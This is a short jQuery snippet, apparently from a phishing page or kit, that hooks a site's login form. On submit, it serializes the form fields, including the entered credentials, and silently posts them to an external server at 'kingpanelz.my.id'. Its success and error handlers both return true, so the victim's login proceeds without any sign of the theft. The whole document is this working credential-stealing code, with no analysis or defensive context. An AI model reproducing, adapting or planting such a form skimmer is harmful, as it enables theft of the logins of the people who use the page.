$(".login-form").submit(function() {  
 var d = $(".login-form");  
  
 $.ajax({  
        url: "https://kingpanelz.my.id/api/js/production/api.php",  
        type: "POST",  
        data: d.serialize(),  
        success: function () {  
            return true;  
        },  
        error: function () {  
            return true;  
        },  
    });  
});